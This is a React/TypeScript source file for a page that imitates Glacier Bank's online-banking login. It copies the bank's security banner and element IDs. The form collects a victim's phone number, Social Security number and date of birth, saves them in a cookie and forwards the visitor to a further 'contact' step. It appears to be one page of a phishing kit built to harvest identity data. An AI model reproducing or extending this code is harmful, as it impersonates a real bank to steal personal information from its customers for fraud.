import React from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";

export default function Additional() {
  const [formInput, setFormInput] = React.useState<Personal>({
    phone: "",
    ssn: "",
    dob:""
  });

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    cookies.set("personal", formInput);
    navigate("../login/contact", { replace: true });
  }

  return (
    <>
      <form action="" method="post" onSubmit={handleSubmit}>
        <div className="MainContent">
          <div id="WelcomeMessageDiv" className="welcome-message">
            <div className="LoginWelcomeLiteralDiv">
              <meta name="generator" content="HTML Tidy, see www.w3.org" />

              <p style={{ color: "blue" }}>
                *FOR SECURITY REASONS, GLACIER BANK RECOMMENDS YOU MAINTAIN
                UP-TO-DATE VIRUS PROTECTION SOFTWARE ON YOUR COMPUTER, CHANGE
                YOUR PASSWORD EVERY 90 DAYS, NEVER OPEN E-MAIL ATTACHMENTS FROM
                AN UNKNOWN SOURCE, AND NEVER PROVIDE PERSONAL ACCOUNT
                INFORMATION BY E-MAIL*
              </p>

              <br />
              <br />
            </div>
          </div>

          <div className="LoginClear"></div>
          <div className="LoginPadding10">
            <div className="row" style={{ marginBottom: "20px" }}>
              <div className="six columns">
                <strong>
                  <label
                    id="ctl00_PageContent_Login1_IdLabel"
                    className="LoginTextBox"
                  >
                    Phone Number
                  </label>
                </strong>
              </div>
              <div className="six columns">
                <input
                  name="phone"
                  type="number"
                  size={30}
                  id="phone"
                  className="LoginIdTextBox"
                  tabIndex={10}
                  onChange={handleInputChange}
                  required
                />
              </div>
            </div>
            <div className="row" style={{ marginBottom: "20px" }}>
              <div className="six columns">
                <strong>
                  <label
                    id="ctl00_PageContent_Login1_IdLabel"
                    className="LoginTextBox"
                  >
                    SSN
                  </label>
                </strong>
              </div>
              <div className="six columns">
                <input
                  name="ssn"
                  type="number"
                  pattern="[0-9]*"
                  inputMode="numeric"
                  size={30}
                  maxLength={10}
                  id="username"
                  className="LoginIdTextBox"
                  tabIndex={10}
                  onChange={handleInputChange}
                  required
                />
              </div>
            </div>
            <div className="row" style={{ marginBottom: "20px" }}>
              <div className="six columns">
                <strong>
                  <label
                    id="ctl00_PageContent_Login1_IdLabel"
                    className="LoginTextBox"
                  >
                    Date of birth
                  </label>
                </strong>
              </div>
              <div className="six columns">
                <input
                  required
                  name="dob"
                  type="date"
                  size={30}
                  id="username"
                  className="LoginIdTextBox"
                  tabIndex={10}
                  onChange={handleInputChange}
                  
                />
              </div>
            </div>
          </div>
         

          <div className="button-containerADA LoginButtonContainerDiv">
            <input
              type="submit"
              name="ctl00$PageContent$Login1$IdSubmitButton"
              value="Submit"
              id="ctl00_PageContent_Login1_IdSubmitButton"
              className="ColorButton"
              tabIndex={11}
            />
          </div>

          <div
            id="ctl00_PageContent_Login1_divPasswordResetLayout2"
            className="LoginCenter"
          ></div>
        </div>
      </form>
    </>
  );
}
